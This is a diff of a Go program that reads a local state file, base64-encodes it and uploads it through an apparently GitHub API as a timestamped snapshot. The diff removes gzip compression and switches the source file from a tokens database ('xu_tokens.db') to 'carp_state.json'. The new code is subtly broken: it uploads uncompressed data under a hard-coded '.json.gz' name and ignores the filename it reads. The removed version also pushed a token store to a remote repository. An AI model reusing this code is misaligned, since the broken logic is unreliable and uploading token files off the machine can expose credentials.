@@ -3,14 +3,12 @@ package main
 
 import (
 	"bytes"
-	"compress/gzip"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
 	"os"
-	"path/filepath"
 	"time"
 )
 
@@ -42,15 +40,15 @@ func main() {
 		os.Exit(1)
 	}
 
-	compressedData, filename, err := compressStateFile()
+	fileData, _, err := readStateFile()
 	if err != nil {
-		fmt.Println("❌ Compression failed:", err)
+		fmt.Println("❌ Reading state file failed:", err)
 		os.Exit(1)
 	}
 
-	filePath = filepath.Base(filename)
+	filePath = "carp_state.json.gz"
 
-	b64Content := base64.StdEncoding.EncodeToString(compressedData)
+	b64Content := base64.StdEncoding.EncodeToString(fileData)
 
 	payload := GitHubRequest{
 		Message: fmt.Sprintf("Snapshot upload %s", time.Now().Format(time.RFC3339)),
@@ -82,21 +80,10 @@ func main() {
 	}
 }
 
-func compressStateFile() ([]byte, string, error) {
-	stateFile := "xu_tokens.db"
-	f, err := os.Open(stateFile)
+func readStateFile() ([]byte, string, error) {
+	data, err := os.ReadFile("carp_state.json")
 	if err != nil {
 		return nil, "", err
 	}
-	defer f.Close()
-
-	var buf bytes.Buffer
-	gz := gzip.NewWriter(&buf)
-	_, err = io.Copy(gz, f)
-	if err != nil {
-		gz.Close()
-		return nil, "", err
-	}
-	gz.Close()
-	return buf.Bytes(), stateFile + ".gz", nil
+	return data, "carp_state.json", nil
 }
